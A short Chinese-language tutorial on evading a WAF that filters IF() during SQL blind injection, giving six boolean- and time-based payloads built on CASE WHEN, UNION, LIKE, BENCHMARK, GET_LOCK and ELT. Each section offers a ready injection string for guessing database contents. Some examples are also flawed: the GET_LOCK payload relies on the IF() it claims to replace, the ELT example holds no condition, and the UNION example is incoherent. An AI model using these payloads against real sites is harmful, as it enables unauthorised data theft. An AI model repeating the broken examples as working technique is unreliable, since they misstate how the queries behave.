### SQL 盲注 if() 函数被过滤怎么绕过

**1. 利用 `CASE WHEN` 语句**

`CASE WHEN` 语句是 SQL 中最常见的条件判断表达式，其功能与 `IF()` 函数非常相似，且通常不会被安全设备过滤

- **语法：** `CASE WHEN [condition] THEN [value1] ELSE [value2] END`
- **布尔盲注绕过：** `SELECT * FROM users WHERE id = 1 AND CASE WHEN (1=1) THEN 1 ELSE 2 END = 1`
- **时间盲注绕过：** `SELECT * FROM users WHERE id = 1 AND CASE WHEN (SUBSTRING(database(),1,1) = 'd') THEN SLEEP(5) ELSE 0 END`

**2. 利用 `UNION` + 错误信息**

当 `IF()` 被过滤，但 `UNION` 和错误信息回显没有被完全禁用时，我们可以利用 `UNION` 来触发自定义的错误信息，从而进行布尔盲注

- **原理：** 通过 `UNION` 将一个错误的查询结果与正常的查询结果合并，当错误的查询语句执行时，数据库会返回错误信息，其中可能包含我们想要的数据
- **绕过方式：** `SELECT * FROM users WHERE id = -1 UNION SELECT 1, 2, 3 FROM DUAL WHERE (1=2) OR (1=1) UNION SELECT 1, 2, 3 FROM (SELECT 1 UNION SELECT 2 UNION SELECT 3)a` 这个方法需要根据具体情况进行调整，利用数据库的语法错误或类型转换错误来触发自定义的错误信息

**3. 利用位运算和 `LIKE` 语句**

当数据库不支持 `IF()` 或 `CASE` 语句时，我们可以利用逻辑运算和位运算来逐位判断数据

- **原理：** `LIKE` 语句可以用于模糊匹配，我们可以将它和数据库中的数据结合起来，逐个字符地猜解
- **绕过方式：** `SELECT * FROM users WHERE id = 1 AND username LIKE 'a%'` 如果该查询返回结果，则说明 `username` 的第一个字符是 'a'。我们可以通过不断改变 `%` 前的字符来逐个猜解数据

**4. 利用 `benchmark()` 函数**

在 MySQL 中，`benchmark()` 函数可以用来执行指定的函数多次，从而消耗大量时间。这可以用来替代 `SLEEP()` 函数进行时间盲注

- **原理：** `BENCHMARK(count, expr)` 会重复执行 `expr` 表达式 `count` 次。如果 `expr` 包含一个耗时的操作，我们可以根据执行时间来判断条件是否成立

- **绕过方式：** `SELECT * FROM users WHERE id = 1 AND BENCHMARK(10000000, MD5(1)) AND (SUBSTRING(database(),1,1) = 'd')`

  如果条件 `(SUBSTRING(database(),1,1) = 'd')` 成立，`BENCHMARK` 函数就会被执行，页面响应会变慢。否则，页面会立即响应

**5. 利用 `get_lock()` 函数**

在 MySQL 中，`GET_LOCK()` 函数可以用于获取一个全局锁，如果锁已被其他会话占用，该函数会等待直到锁被释放或超时

- **原理：** 我们可以利用 `GET_LOCK()` 函数设置一个长达数秒的锁，从而实现时间盲注的效果

- **绕过方式：** `SELECT * FROM users WHERE id = 1 AND IF((SUBSTRING(database(),1,1)='d'), GET_LOCK('hack', 5), 0)`

  如果条件成立，`GET_LOCK` 会被执行，页面会等待 5 秒

**6. 利用 `ELT()` 函数**

`ELT()` 函数是 MySQL 中的一个字符串函数，它可以根据索引返回列表中的一个字符串

- **原理：** `ELT(N, str1, str2, ...)` 返回第 N 个字符串。我们可以将它与条件判断结合，实现布尔盲注
- **绕过方式：** `SELECT * FROM users WHERE id = 1 AND ELT(1, 'false', 'true')` 如果条件为真，`ELT` 会返回 `true`，否则返回 `false`